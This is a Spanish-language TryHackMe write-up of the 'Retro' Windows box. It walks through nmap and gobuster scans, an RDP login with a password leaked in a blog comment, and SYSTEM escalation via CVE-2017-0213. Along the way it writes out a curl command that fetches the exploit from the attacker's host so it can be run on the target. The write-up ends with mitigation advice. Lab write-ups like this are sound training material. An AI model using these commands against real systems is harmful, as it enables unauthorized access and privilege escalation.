---
layout: page
title: "Write-up: Retro"
platform: "TryHackMe"
difficulty: "Medium"
category: "Boot2Root"
---

**Write-up**: Retro - TryHackMe  
**Fecha**: 03/04/2026  
**Autor**: Adrian Sanchez Torrejon  
**Dificultad**: Media  
**IP de la Máquina**: 10.128.188.24

---

# 1. Resumen Ejecutivo

La máquina Retro es de dificultad fácil y cuenta con un sistema operativo Windows. El acceso inicial se obtuvo tras enumerar un sitio web donde se descubrieron las credenciales de un usuario local en los comentarios del blog, ganando acceso mediante el servicio de Escritorio Remoto (RDP). La escalada de privilegios se logró de manera exitosa explotando la vulnerabilidad de elevación de privilegios en el Administrador de Agregación COM (CVE-2017-0213).

- **Acceso a Usuario**: Conseguido
- **Acceso a Root(SYSTEM)**: Conseguido

# 2. Reconocimiento y Enumeración

## 2.1 Escaneo de Puertos (Nmap)

Se realiza un escaneo inicial para identificar los puertos abiertos y los servicios en ejecución.

```bash
nmap -sV -O -Pn 10.128.188.24
```

**Resultados:** 

![image.png](/assets/images/retro/image.png)

## 2.1 Escaneo Web

Se ejecutó un escaneo de directorios con Gobuster para buscar rutas y directorios ocultos en el servidor web.

- **Herramienta usada:** gobuster

`gobuster dir -u http://10.128.188.24 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txtre`

- **Hallazgos:**

![image.png](/assets/images/retro/image%201.png)

# 3. Explotación (Acceso Inicial)

## 3.1 Identificación de la Vulnerabilidad

Al acceder al directorio `/retro/`, se observó un blog dedicado a videojuegos. Tras inspeccionar los artículos, puntualmente en el post titulado **"Ready Player One"**, se descubrió un comentario dejado por el autor **Wade**.

El comentario contenía el siguiente recordatorio de contraseña: *"Leaving myself a note here just in case I forget how to spell it: parzival"*.
Esto expuso credenciales válidas:

- **Usuario:** `Wade`
- **Contraseña:** `parzival`

![image.png](/assets/images/retro/image%202.png)

## 3.2 Ejecución y Shell

Dado que el puerto 3389 (RDP) estaba abierto en el reconocimiento inicial, utilicé las credenciales de Wade para autenticarme de manera gráfica.

```bash
xfreerdp /v:10.128.188.24  /u:Wade /p:parzival
```

![image.png](/assets/images/Blaster/image%203.png)

La conexión fue exitosa y obtuve acceso directo al escritorio del usuario Wade.

# 4. Escalada de Privilegios (System / Root)

## 4.1 Explotación y Acceso SYSTEM

1. Investigando posibles vectores de ataque para la versión de Windows objetivo, se determinó que era vulnerable al fallo de seguridad en el Administrador de Agregación COM de Windows (CVE-2017-0213).

Archivo descargado: [https://github.com/Anonymous-Family/CVE-2017-0213](https://github.com/Anonymous-Family/CVE-2017-0213)

```bash
python -m http.server 80
```

![image.png](/assets/images/retro/image%203.png)

1. En la máquina objetivo, utilicé la herramienta `curl` en la consola PowerShell para descargar el exploit comprimido:

```bash
curl -o exploit.zip http://192.168.146.227/CVE-2017-0213_x64.zip
```

![image.png](/assets/images/retro/image%204.png)

1. 
2. Descomprimí el archivo y ejecuté el binario `CVE-2017-0213_x64.exe`. Esto disparó una nueva consola de CMD. 

![image.png](/assets/images/retro/image%205.png)

¡Acceso como **SYSTEM** concedido!

# 5. Recomendaciones de Mitigación

Para evitar el compromiso de un sistema similar, se deben aplicar las siguientes mitigaciones:

1. **Prácticas de Credenciales Seguras:** No permitir bajo ningún concepto la inclusión de contraseñas u otros secretos en los comentarios públicos de blogs o plataformas de libre lectura.
2. **Instalación de Parches:** Actualizar el sistema operativo Windows para solventar la vulnerabilidad crítica en COM (CVE-2017-0213).
3. **Control y Seguridad RDP:** Restringir el acceso directo por RDP a través de internet, limitándolo únicamente a usuarios que hagan uso de una VPN o implementando autenticación multifactor (MFA).